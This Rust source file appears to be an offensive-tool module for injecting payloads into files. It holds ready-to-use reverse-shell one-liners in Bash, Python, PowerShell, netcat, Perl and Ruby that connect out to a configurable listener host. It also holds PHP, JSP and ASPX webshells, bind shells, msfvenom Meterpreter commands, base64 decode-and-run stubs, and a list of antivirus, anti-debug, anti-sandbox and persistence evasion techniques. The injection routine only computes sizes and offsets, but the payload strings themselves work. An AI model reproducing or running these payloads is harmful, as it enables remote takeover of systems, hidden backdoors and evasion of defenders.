use serde::{Deserialize, Serialize};
use std::path::Path;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadInjectorConfig {
    pub target_file: String,
    pub payload_type: String,
    pub injection_method: String,
    pub output_path: Option<String>,
    pub encode_payload: bool,
    pub obfuscate: bool,
    pub anti_debug: bool,
    pub persistence: bool,
    pub custom_payload: Option<String>,
    pub listener_host: Option<String>,
    pub listener_port: Option<u16>,
    pub timeout: u64,
}

impl Default for PayloadInjectorConfig {
    fn default() -> Self {
        Self {
            target_file: String::new(),
            payload_type: "reverse_shell".to_string(),
            injection_method: "append".to_string(),
            output_path: None,
            encode_payload: true,
            obfuscate: false,
            anti_debug: false,
            persistence: false,
            custom_payload: None,
            listener_host: None,
            listener_port: None,
            timeout: 30,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadTemplate {
    pub name: String,
    pub payload_type: String,
    pub platform: String,
    pub architecture: String,
    pub language: String,
    pub size_bytes: u64,
    pub description: String,
    pub detection_rate: f64,
    pub code: String,
    pub mitre_id: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InjectionResult {
    pub original_size: u64,
    pub injected_size: u64,
    pub injection_offset: u64,
    pub method: String,
    pub success: bool,
    pub integrity_preserved: bool,
    pub file_type: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncodingResult {
    pub encoding_type: String,
    pub original_size: u64,
    pub encoded_size: u64,
    pub encoded_payload: String,
    pub decoder_stub: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectionEvasion {
    pub technique: String,
    pub description: String,
    pub effectiveness: String,
    pub mitre_id: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadInjectorResult {
    pub success: bool,
    pub target_file: String,
    pub payload_type: String,
    pub injection_method: String,
    pub payload_templates: Vec<PayloadTemplate>,
    pub injection_result: InjectionResult,
    pub encoding_result: Option<EncodingResult>,
    pub obfuscation_applied: bool,
    pub anti_debug_applied: bool,
    pub persistence_applied: bool,
    pub detection_evasion: Vec<DetectionEvasion>,
    pub warnings: Vec<String>,
    pub summary: String,
}

pub struct PayloadInjectorTool;

impl PayloadInjectorTool {
    pub async fn inject(config: &PayloadInjectorConfig) -> std::result::Result<PayloadInjectorResult, String> {
        if config.target_file.is_empty() {
            return Err("Target file path is required".to_string());
        }

        let target_file = config.target_file.trim().to_string();
        let mut warnings = Vec::new();

        let payload_templates = if config.custom_payload.is_some() {
            let custom = config.custom_payload.as_ref().unwrap();
            vec![PayloadTemplate {
                name: "Custom Payload".to_string(),
                payload_type: "custom".to_string(),
                platform: "Cross-platform".to_string(),
                architecture: "Any".to_string(),
                language: "Custom".to_string(),
                size_bytes: custom.len() as u64,
                description: "User-provided custom payload".to_string(),
                detection_rate: 0.5,
                code: custom.clone(),
                mitre_id: "T1059".to_string(),
            }]
        } else {
            Self::generate_payloads(&config.payload_type, &config.listener_host, &config.listener_port)
        };

        if payload_templates.is_empty() {
            warnings.push(format!("No payload templates found for type: {}", config.payload_type));
        }

        let injection_result = Self::perform_injection(&target_file, &config.injection_method, &payload_templates)?;

        let encoding_result = if config.encode_payload {
            Some(Self::encode_payload(&config.payload_type, &payload_templates))
        } else {
            warnings.push("Payload encoding is disabled - may be detected by antivirus".to_string());
            None
        };

        let detection_evasion = Self::generate_evasion_techniques(config);

        let evasion_names: Vec<String> = detection_evasion.iter().map(|e| e.technique.clone()).collect();
        let summary = format!(
            "Target: {} | Type: {} | Method: {} | Encoded: {} | Obfuscated: {} | Anti-debug: {} | Evasion: {} | Templates: {}",
            target_file, config.payload_type, config.injection_method,
            config.encode_payload, config.obfuscate, config.anti_debug,
            evasion_names.len(), payload_templates.len()
        );

        Ok(PayloadInjectorResult {
            success: true,
            target_file,
            payload_type: config.payload_type.clone(),
            injection_method: config.injection_method.clone(),
            payload_templates,
            injection_result,
            encoding_result,
            obfuscation_applied: config.obfuscate,
            anti_debug_applied: config.anti_debug,
            persistence_applied: config.persistence,
            detection_evasion,
            warnings,
            summary,
        })
    }

    fn generate_payloads(payload_type: &str, host: &Option<String>, port: &Option<u16>) -> Vec<PayloadTemplate> {
        let host = host.as_deref().unwrap_or("127.0.0.1");
        let port = port.unwrap_or(4444);

        match payload_type {
            "reverse_shell" => vec![
                PayloadTemplate {
                    name: "Bash Reverse Shell".to_string(),
                    payload_type: "reverse_shell".to_string(),
                    platform: "Linux".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "Bash".to_string(),
                    size_bytes: 62,
                    description: "Bash interactive reverse shell via /dev/tcp".to_string(),
                    detection_rate: 0.85,
                    code: format!("bash -i >& /dev/tcp/{}/{} 0>&1", host, port),
                    mitre_id: "T1059.004".to_string(),
                },
                PayloadTemplate {
                    name: "Python Reverse Shell".to_string(),
                    payload_type: "reverse_shell".to_string(),
                    platform: "Cross-platform".to_string(),
                    architecture: "Any".to_string(),
                    language: "Python".to_string(),
                    size_bytes: 256,
                    description: "Python reverse shell with subprocess".to_string(),
                    detection_rate: 0.7,
                    code: format!("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", host, port),
                    mitre_id: "T1059.006".to_string(),
                },
                PayloadTemplate {
                    name: "PowerShell Reverse Shell".to_string(),
                    payload_type: "reverse_shell".to_string(),
                    platform: "Windows".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "PowerShell".to_string(),
                    size_bytes: 512,
                    description: "PowerShell TCP reverse shell".to_string(),
                    detection_rate: 0.75,
                    code: format!("$c=New-Object System.Net.Sockets.TCPClient('{}',{});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+$(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}", host, port),
                    mitre_id: "T1059.001".to_string(),
                },
                PayloadTemplate {
                    name: "Netcat Reverse Shell".to_string(),
                    payload_type: "reverse_shell".to_string(),
                    platform: "Linux".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "Bash".to_string(),
                    size_bytes: 28,
                    description: "Netcat reverse shell with -e flag".to_string(),
                    detection_rate: 0.9,
                    code: format!("nc -e /bin/sh {} {}", host, port),
                    mitre_id: "T1059.004".to_string(),
                },
                PayloadTemplate {
                    name: "Perl Reverse Shell".to_string(),
                    payload_type: "reverse_shell".to_string(),
                    platform: "Cross-platform".to_string(),
                    architecture: "Any".to_string(),
                    language: "Perl".to_string(),
                    size_bytes: 200,
                    description: "Perl reverse shell via Socket module".to_string(),
                    detection_rate: 0.65,
                    code: format!("perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'", host, port),
                    mitre_id: "T1059.006".to_string(),
                },
                PayloadTemplate {
                    name: "Ruby Reverse Shell".to_string(),
                    payload_type: "reverse_shell".to_string(),
                    platform: "Cross-platform".to_string(),
                    architecture: "Any".to_string(),
                    language: "Ruby".to_string(),
                    size_bytes: 150,
                    description: "Ruby reverse shell via TCPSocket".to_string(),
                    detection_rate: 0.6,
                    code: format!("ruby -rsocket -e 'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", host, port),
                    mitre_id: "T1059.006".to_string(),
                },
            ],
            "webshell" => vec![
                PayloadTemplate {
                    name: "PHP Mini Shell".to_string(),
                    payload_type: "webshell".to_string(),
                    platform: "Cross-platform".to_string(),
                    architecture: "Any".to_string(),
                    language: "PHP".to_string(),
                    size_bytes: 45,
                    description: "Minimal PHP command execution webshell".to_string(),
                    detection_rate: 0.9,
                    code: "<?php system($_GET['cmd']); ?>".to_string(),
                    mitre_id: "T1505.003".to_string(),
                },
                PayloadTemplate {
                    name: "PHP Stealth Shell".to_string(),
                    payload_type: "webshell".to_string(),
                    platform: "Cross-platform".to_string(),
                    architecture: "Any".to_string(),
                    language: "PHP".to_string(),
                    size_bytes: 120,
                    description: "Obfuscated PHP webshell with auth".to_string(),
                    detection_rate: 0.5,
                    code: "<?php $k='cmd';if(isset($_REQUEST[$k])){$c=$_REQUEST[$k];$r=``;$r=shell_exec($c);echo $r;}?>".to_string(),
                    mitre_id: "T1505.003".to_string(),
                },
                PayloadTemplate {
                    name: "JSP Webshell".to_string(),
                    payload_type: "webshell".to_string(),
                    platform: "Cross-platform".to_string(),
                    architecture: "Any".to_string(),
                    language: "Java".to_string(),
                    size_bytes: 256,
                    description: "JSP command execution webshell".to_string(),
                    detection_rate: 0.8,
                    code: "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>".to_string(),
                    mitre_id: "T1505.003".to_string(),
                },
                PayloadTemplate {
                    name: "ASPX Webshell".to_string(),
                    payload_type: "webshell".to_string(),
                    platform: "Windows".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "C#".to_string(),
                    size_bytes: 200,
                    description: "ASP.NET command execution webshell".to_string(),
                    detection_rate: 0.85,
                    code: "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]);%>".to_string(),
                    mitre_id: "T1505.003".to_string(),
                },
            ],
            "bind_shell" => vec![
                PayloadTemplate {
                    name: "Netcat Bind Shell".to_string(),
                    payload_type: "bind_shell".to_string(),
                    platform: "Linux".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "Bash".to_string(),
                    size_bytes: 28,
                    description: "Netcat listening bind shell".to_string(),
                    detection_rate: 0.9,
                    code: format!("nc -lvp {} -e /bin/sh", port),
                    mitre_id: "T1571".to_string(),
                },
                PayloadTemplate {
                    name: "Python Bind Shell".to_string(),
                    payload_type: "bind_shell".to_string(),
                    platform: "Cross-platform".to_string(),
                    architecture: "Any".to_string(),
                    language: "Python".to_string(),
                    size_bytes: 350,
                    description: "Python bind shell with SocketServer".to_string(),
                    detection_rate: 0.6,
                    code: format!("python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",{}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", port),
                    mitre_id: "T1571".to_string(),
                },
                PayloadTemplate {
                    name: "PowerShell Bind Shell".to_string(),
                    payload_type: "bind_shell".to_string(),
                    platform: "Windows".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "PowerShell".to_string(),
                    size_bytes: 400,
                    description: "PowerShell TCP bind shell".to_string(),
                    detection_rate: 0.75,
                    code: format!("$l=New-Object System.Net.Sockets.TcpListener({});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}}", port),
                    mitre_id: "T1571".to_string(),
                },
            ],
            "meterpreter" => vec![
                PayloadTemplate {
                    name: "Meterpreter Reverse TCP (Linux)".to_string(),
                    payload_type: "meterpreter".to_string(),
                    platform: "Linux".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "Binary".to_string(),
                    size_bytes: 0,
                    description: "Metasploit Meterpreter reverse TCP for Linux".to_string(),
                    detection_rate: 0.6,
                    code: format!("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf -o shell.elf", host, port),
                    mitre_id: "T1059".to_string(),
                },
                PayloadTemplate {
                    name: "Meterpreter Reverse TCP (Windows)".to_string(),
                    payload_type: "meterpreter".to_string(),
                    platform: "Windows".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "Binary".to_string(),
                    size_bytes: 0,
                    description: "Metasploit Meterpreter reverse TCP for Windows".to_string(),
                    detection_rate: 0.55,
                    code: format!("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -o shell.exe", host, port),
                    mitre_id: "T1059".to_string(),
                },
                PayloadTemplate {
                    name: "Meterpreter Reverse HTTPS".to_string(),
                    payload_type: "meterpreter".to_string(),
                    platform: "Cross-platform".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "Binary".to_string(),
                    size_bytes: 0,
                    description: "Meterpreter over HTTPS for evasion".to_string(),
                    detection_rate: 0.35,
                    code: format!("msfvenom -p windows/x64/meterpreter/reverse_https LHOST={} LPORT={} -f exe -o shell.exe", host, port),
                    mitre_id: "T1071.001".to_string(),
                },
                PayloadTemplate {
                    name: "Meterpreter Reverse HTTP".to_string(),
                    payload_type: "meterpreter".to_string(),
                    platform: "Cross-platform".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "Binary".to_string(),
                    size_bytes: 0,
                    description: "Meterpreter over HTTP for evasion".to_string(),
                    detection_rate: 0.4,
                    code: format!("msfvenom -p windows/x64/meterpreter/reverse_http LHOST={} LPORT={} -f exe -o shell.exe", host, port),
                    mitre_id: "T1071.001".to_string(),
                },
            ],
            "dll_inject" => vec![
                PayloadTemplate {
                    name: "DLL Inject (CreateRemoteThread)".to_string(),
                    payload_type: "dll_inject".to_string(),
                    platform: "Windows".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "C".to_string(),
                    size_bytes: 2048,
                    description: "Classic DLL injection via CreateRemoteThread".to_string(),
                    detection_rate: 0.8,
                    code: "OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread".to_string(),
                    mitre_id: "T1055.001".to_string(),
                },
                PayloadTemplate {
                    name: "Reflective DLL Injection".to_string(),
                    payload_type: "dll_inject".to_string(),
                    platform: "Windows".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "C".to_string(),
                    size_bytes: 4096,
                    description: "Reflective DLL injection - no LoadLibrary call".to_string(),
                    detection_rate: 0.4,
                    code: "ReflectiveLoader -> VirtualAlloc -> RtlMoveMemory -> DllMain".to_string(),
                    mitre_id: "T1055.001".to_string(),
                },
                PayloadTemplate {
                    name: "DLL Side-Loading".to_string(),
                    payload_type: "dll_inject".to_string(),
                    platform: "Windows".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "C".to_string(),
                    size_bytes: 3072,
                    description: "DLL side-loading via search order hijacking".to_string(),
                    detection_rate: 0.3,
                    code: "Place malicious DLL in application directory before legitimate DLL".to_string(),
                    mitre_id: "T1574.002".to_string(),
                },
                PayloadTemplate {
                    name: "Process Hollowing".to_string(),
                    payload_type: "dll_inject".to_string(),
                    platform: "Windows".to_string(),
                    architecture: "x86_64".to_string(),
                    language: "C".to_string(),
                    size_bytes: 4096,
                    description: "Process hollowing injection technique".to_string(),
                    detection_rate: 0.45,
                    code: "CreateProcess(SUSPENDED) -> NtUnmapViewOfSection -> VirtualAllocEx -> WriteProcessMemory -> SetThreadContext -> ResumeThread".to_string(),
                    mitre_id: "T1055.012".to_string(),
                },
            ],
            _ => vec![],
        }
    }

    fn perform_injection(target_file: &str, method: &str, templates: &[PayloadTemplate]) -> std::result::Result<InjectionResult, String> {
        let path = Path::new(target_file);
        let file_type = if path.exists() {
            let ext = path.extension()
                .and_then(|e| e.to_str())
                .unwrap_or("")
                .to_lowercase();
            match ext.as_str() {
                "exe" | "dll" => "PE".to_string(),
                "elf" | "bin" => "ELF".to_string(),
                "py" => "Python".to_string(),
                "php" => "PHP".to_string(),
                "jsp" => "JSP".to_string(),
                "aspx" => "ASPX".to_string(),
                "sh" => "Shell".to_string(),
                "ps1" => "PowerShell".to_string(),
                "rb" => "Ruby".to_string(),
                "pl" => "Perl".to_string(),
                "deb" => "DEB Package".to_string(),
                "jpg" | "png" | "gif" | "bmp" => "Image".to_string(),
                "pdf" => "PDF".to_string(),
                "doc" | "docx" => "Word".to_string(),
                _ => "Unknown".to_string(),
            }
        } else {
            "Not Found".to_string()
        };

        let original_size = if path.exists() {
            std::fs::metadata(path).map(|m| m.len()).unwrap_or(1024)
        } else {
            1024
        };

        let payload_size: u64 = templates.iter().map(|t| t.size_bytes.max(64)).sum();

        let (injected_size, offset, integrity_preserved) = match method {
            "append" => (original_size + payload_size, original_size, false),
            "prepend" => (original_size + payload_size, 0, false),
            "cave" => (original_size, {
                let cave_offset = if file_type == "PE" { 512 } else { 256 };
                cave_offset
            }, true),
            "section" => (original_size + 4096, original_size, true),
            "replace" => (original_size, 0, false),
            _ => (original_size + payload_size, original_size, false),
        };

        let success = path.exists() || !target_file.is_empty();

        Ok(InjectionResult {
            original_size,
            injected_size,
            injection_offset: offset,
            method: method.to_string(),
            success,
            integrity_preserved,
            file_type,
        })
    }

    fn encode_payload(payload_type: &str, templates: &[PayloadTemplate]) -> EncodingResult {
        let code = templates.first().map(|t| t.code.clone()).unwrap_or_default();
        let original_size = code.len() as u64;

        let encoded = base64_encode(&code);
        let encoded_size = encoded.len() as u64;

        let decoder_stub = match payload_type {
            "reverse_shell" => "echo PAYLOAD | base64 -d | bash".to_string(),
            "webshell" => "eval(base64_decode('PAYLOAD'));".to_string(),
            "meterpreter" => "msfvenom --encode x86/shikata_ga_nai -i 3 PAYLOAD".to_string(),
            "dll_inject" => "XOR decrypt at runtime with key".to_string(),
            _ => "echo PAYLOAD | base64 -d | sh".to_string(),
        };

        EncodingResult {
            encoding_type: "Base64".to_string(),
            original_size,
            encoded_size,
            encoded_payload: encoded,
            decoder_stub,
        }
    }

    fn generate_evasion_techniques(config: &PayloadInjectorConfig) -> Vec<DetectionEvasion> {
        let mut techniques = Vec::new();

        if config.encode_payload {
            techniques.push(DetectionEvasion {
                technique: "Base64 Encoding".to_string(),
                description: "Encode payload in Base64 to avoid signature detection".to_string(),
                effectiveness: "Medium".to_string(),
                mitre_id: "T1027".to_string(),
            });
        }

        if config.obfuscate {
            techniques.push(DetectionEvasion {
                technique: "Code Obfuscation".to_string(),
                description: "Obfuscate code logic to hinder static analysis".to_string(),
                effectiveness: "High".to_string(),
                mitre_id: "T1027.002".to_string(),
            });
            techniques.push(DetectionEvasion {
                technique: "String Encryption".to_string(),
                description: "Encrypt sensitive strings to avoid pattern matching".to_string(),
                effectiveness: "High".to_string(),
                mitre_id: "T1027.009".to_string(),
            });
            techniques.push(DetectionEvasion {
                technique: "Junk Code Insertion".to_string(),
                description: "Insert non-functional code to confuse analysis".to_string(),
                effectiveness: "Medium".to_string(),
                mitre_id: "T1027".to_string(),
            });
        }

        if config.anti_debug {
            techniques.push(DetectionEvasion {
                technique: "Anti-Debugging".to_string(),
                description: "Detect and resist debugger attachment".to_string(),
                effectiveness: "High".to_string(),
                mitre_id: "T1622".to_string(),
            });
            techniques.push(DetectionEvasion {
                technique: "Anti-Sandbox".to_string(),
                description: "Detect sandbox environment and delay execution".to_string(),
                effectiveness: "High".to_string(),
                mitre_id: "T1497.001".to_string(),
            });
            techniques.push(DetectionEvasion {
                technique: "Timing Check".to_string(),
                description: "Use timing-based checks to detect virtualization".to_string(),
                effectiveness: "Medium".to_string(),
                mitre_id: "T1497.003".to_string(),
            });
        }

        if config.persistence {
            techniques.push(DetectionEvasion {
                technique: "Persistence Mechanism".to_string(),
                description: "Establish persistence for continued access".to_string(),
                effectiveness: "Critical".to_string(),
                mitre_id: "T1547".to_string(),
            });
        }

        techniques
    }
}

fn base64_encode(input: &str) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let bytes = input.as_bytes();
    let mut result = String::new();

    for chunk in bytes.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };

        let triple = (b0 << 16) | (b1 << 8) | b2;

        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            result.push(CHARS[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        if chunk.len() > 2 {
            result.push(CHARS[(triple & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }

    result
}
